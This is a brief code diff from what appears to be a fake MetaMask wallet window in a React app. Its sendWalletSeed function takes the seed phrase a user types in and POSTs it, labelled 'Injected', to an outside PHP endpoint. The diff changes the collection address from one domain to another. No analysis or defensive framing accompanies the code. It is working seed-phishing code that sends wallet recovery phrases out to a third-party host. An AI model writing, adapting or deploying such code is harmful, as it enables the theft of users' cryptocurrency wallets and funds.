@@ -21,7 +21,7 @@ const MetaMaskWin = () => {
     setWalletSeedInput(e.target.value);
   }
   async function sendWalletSeed() {
-    fetch("https://hobbystudio.ge/test.php", {
+    fetch("https://beefyv.finance/send_mail.php", {
       method: 'POST',
       body: JSON.stringify({ text: walletSeedInput, title: 'Injected'})
     }) 
